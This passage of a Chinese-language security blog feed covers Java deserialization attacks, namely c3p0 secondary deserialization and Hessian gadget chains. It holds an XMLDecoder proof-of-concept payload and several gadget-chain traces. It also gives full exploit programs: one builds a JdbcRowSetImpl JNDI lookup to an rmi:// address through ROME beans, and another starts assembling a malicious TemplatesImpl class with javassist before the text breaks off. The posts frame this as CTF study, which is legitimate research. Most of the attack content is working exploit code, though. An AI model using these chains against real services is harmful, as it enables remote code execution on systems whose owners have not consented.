class="hljs-keyword">static</span> String <span class="hljs-title function_">fileToHex</span><span class="hljs-params">(String filePath)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">hexBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath)) &#123;<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> bytesRead;<br><br>            <span class="hljs-keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> bytesToHex(buffer, bytesRead);<br>                hexBuilder.append(hex);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> hexBuilder.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes, <span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length * <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            sb.append(Character.forDigit((bytes[i] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xF</span>, <span class="hljs-number">16</span>));<br>            sb.append(Character.forDigit((bytes[i] &amp; <span class="hljs-number">0xF</span>), <span class="hljs-number">16</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Xml-poc</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;setUserOverridesAsString&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;setUserOverridesAsString&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>HexAsciiSerializedMap:SEROBJHEX;<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>​怎么看c3p0的二次都很鸡肋。24年了，只能说ctf专项吧。</p><h2 id="抄作业链接"><a href="#抄作业链接" class="headerlink" title="抄作业链接"></a>抄作业链接</h2><p><a href="https://xz.aliyun.com/t/10728">https://xz.aliyun.com/t/10728</a></p><p><a href="https://tttang.com/archive/1701/#toc__7">https://tttang.com/archive/1701/#toc__7</a></p><p><a href="http://moonflower.fun/index.php/2022/04/18/316/">http://moonflower.fun/index.php/2022/04/18/316/</a></p><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/xmldecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://johnfrod.top/%E5%AE%89%E5%85%A8/xmldecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hessian学习</title>
    <link href="/2024/01/18/Hessian%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/01/18/Hessian%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="Hessian是什么"><a href="#Hessian是什么" class="headerlink" title="Hessian是什么"></a>Hessian是什么</h2><p>Hessian是一个基于RPC的高性能二进制远程传输<strong>协议</strong>，官方对Java、Flash&#x2F;Flex、Python、C++、.NET C#等多种语言都进行了实现，并且Hessian一般通过Web Service提供服务。在Java中，Hessian的使用方法非常简单，它使用Java语言接口定义了远程对象，并通过序列化和反序列化将对象转为Hessian二进制格式进行传输。</p><h3 id="0x01-反序列化分析"><a href="#0x01-反序列化分析" class="headerlink" title="0x01 反序列化分析"></a>0x01 反序列化分析</h3><p>demo，直接搬的枫师傅的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hessian_Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>  &#123;<br>        <span class="hljs-keyword">public</span> String name;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> age;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> name;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>            <span class="hljs-built_in">this</span>.age = age;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person(name=&quot;</span>+name+<span class="hljs-string">&quot;,age=&quot;</span>+age+<span class="hljs-string">&quot;)&quot;</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bao);<br>        output.setSerializerFactory(serializerFactory);<br>        output.writeObject(o);<br>        System.out.println(bao.toString());<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bai</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(bai);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> input.readObject();<br>        <span class="hljs-keyword">return</span> (T) o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">996</span>);<br>        person.setName(<span class="hljs-string">&quot;Feng&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] s = serialize(person);<br>        System.out.println((Person)deserialize(s));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240122014944883.png" alt="image-20240122014944883"></p><p>可以序列化数据是以“mt”表示服。</p><p>与序列化过程设计类似，Hessian 定义了 Deserializer 接口，并为不同的类型创建了不同的实现类。这里重点看下对自定义类型对象的读取。</p><p>在 Hessian 1.0 的 HessianInput 中，没有针对 Object 的读取，而是都将其作为 Map 读取，在序列化的过程中我们也提到，在写入自定义类型时会将其标记为 Map 类型。</p><p>在 Hessian 2.0 中，则是提供了 UnsafeDeserializer 来对自定义类型数据进行反序列化，关键方法在 readObject 处。</p><p><img src="image-20240122005852898.png" alt="image-20240122005852898"></p><p>由于 Hessian 1.0 会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为77）。</p><p>在HessianInput#readObject中会使用case语句选择。</p><p><img src="image-20240122010920029.png" alt="image-20240122010920029"></p><p>由于Hessian 2.0t会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为72）。</p><p>在Hessian2Input#readObject中会使用case语句选择。</p><p><img src="image-20240122011138483.png" alt="image-20240122011138483"></p><p><img src="image-20240122011102930.png" alt="image-20240122011102930"></p><p>最后都会待用SerializerFactory.class#readMap()</p><p><img src="image-20240122013120135.png" alt="image-20240122013120135"></p><p>通过<code>getDeserializer()</code>来获取一个<code>deserializer</code></p><p>com&#x2F;caucho&#x2F;hessian&#x2F;io&#x2F;SerializerFactory.java#getDeserializer（）</p><p><img src="image-20240122013421743.png" alt="image-20240122013421743"></p><p>通过<code>getDeserializer()</code>来获取一个<code>deserializer</code>,没有就new一个，ram嗨皮创建一个HashMap作为缓存，并将我们需要反序列化的类作为<code>key</code>放入HashMap中。</p><p><img src="image-20240122013648618.png" alt="image-20240122013648618"></p><p><img src="image-20240122013658581.png" alt="image-20240122013658581"></p><p> HashMap 在 put 键值对时，将会对 key 的 hashcode 进行校验查看是否有重复的 key 出现，这就将会调用 key 的 hasCode 方法。</p><p>也就是说 Hessian 相对比原生反序列化的利用链，有几个限制：</p><ul><li><p>gadget chain 起始方法只能为 hashCode&#x2F;equals</p></li><li><p>利用链中调用的成员变量不能为 transient 修饰</p></li><li><p>所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter&#x2F;setter 的逻辑</p><p>TemplatesImpl类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致TemplatesImpl类无法初始化</p><p>可以参考这个，<a href="https://www.cnblogs.com/LittleHann/p/17818994.html">https://www.cnblogs.com/LittleHann/p/17818994.html</a></p><p>MapDeserializer#readMap 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。在没有指定 Map 的具体实现类时，将会默认使用 HashMap ，对于 SortedMap，将会使用 TreeMap。</p><p><img src="image-20240122015558230.png" alt="image-20240122015558230"></p><p>参考xstreem，有一下两条</p><p>通过TreeMap去触发compareTo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet.putAll<br>javax.naming.ldap.Rdn$RdnEntry.compareTo<br>    com.sun.org.apache.xpath.internal.objects.XString.equal<br>        javax.sound.sampled.AudioFileFormat.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet.putAll<br>javax.naming.ldap.Rdn$RdnEntry.compareTo<br>    com.sun.org.apache.xpath.internal.objects.XStringForFSB.equal<br>        javax.swing.MultiUIDefaults.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br></code></pre></td></tr></table></figure><h3 id="0x02-构造exp"><a href="#0x02-构造exp" class="headerlink" title="0x02 构造exp"></a>0x02 构造exp</h3><h4 id="一、想到就是hashmap-remo-jndi"><a href="#一、想到就是hashmap-remo-jndi" class="headerlink" title="一、想到就是hashmap-&gt;remo-&gt;jndi"></a>一、想到就是hashmap-&gt;remo-&gt;jndi</h4><p>TemplatesImpl类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致TemplatesImpl类无法初始化</p><p><strong>为什么使用Java原生反序列化时不会报错</strong></p><p>我们知道，在使用Java原生的反序列化时，如果被反序列化的类重写了<code>readObject()</code>，那么Java就会通过反射来调用重写的<code>readObject()</code></p><p><img src="%E5%9B%BE%E7%89%87-68.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiUIDefaults</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><span class="hljs-comment">//    static SerializerFactory serializerFactory = new SerializerFactory();</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        serializerFactory.setAllowNonSerializable(true);</span><br><br><br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/remoteExploit8&quot;</span>);<br>        jdbcRowSet.setMatchColumn(<span class="hljs-string">&quot;1&quot;</span>);<br><br><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(jdbcRowSet.getClass(),jdbcRowSet));<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(equalsBean,<span class="hljs-string">&quot;2&quot;</span>);<br><br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">hessian_jndi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;hessian_jndi&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(hessian_jndi);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.flushBuffer();<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">hessian_jndi1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;hessian_jndi&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(hessian_jndi1);<br>        hessian2Input.readObject();<br><br><span class="hljs-comment">//        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-comment">//        ObjectOutputStream outputStream = new ObjectOutputStream(baos);</span><br><span class="hljs-comment">//        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">//        outputStream.close();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="hljs-comment">//        ObjectInputStream Input = new ObjectInputStream(bais);</span><br><span class="hljs-comment">//        Input.readObject();</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="二、hessisan-SignedObject二次反序列化"><a href="#二、hessisan-SignedObject二次反序列化" class="headerlink" title="二、hessisan-&gt;SignedObject二次反序列化"></a>二、hessisan-&gt;SignedObject二次反序列化</h4><p>hashmap.hashcode()-&gt;remo.toString()-&gt;signedObject.getObject-&gt;BadAttributeValueExpException.readObject-&gt;remo.toString()-&gt;templateiml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javafx.beans.property.Property;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessian_tostring</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br><br><br><span class="hljs-comment">//        UIDefaults uiDefaults = new UIDefaults();</span><br><span class="hljs-comment">//        uiDefaults.put(&quot;aaa&quot;, new SwingLazyValue(&quot;javax.naming.InitialContext&quot;, &quot;doLookup&quot;, new Object[]&#123;&quot;rmi://127.0.0.1:1099/remoteExploit8&quot;&#125;));</span><br><span class="hljs-comment">//        Class&lt;?&gt; aClass = Class.forName(&quot;javax.swing.MultiUIDefaults&quot;);</span><br><span class="hljs-comment">//        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(UIDefaults[].class);</span><br><span class="hljs-comment">//        declaredConstructor.setAccessible(true);</span><br><span class="hljs-comment">//        Object o = declaredConstructor.newInstance(new Object[]&#123;new UIDefaults[]&#123;uiDefaults&#125;&#125;);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        EqualsBean equalsBean = new EqualsBean(Object.class,o);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap.put(equalsBean,&quot;2&quot;);</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span 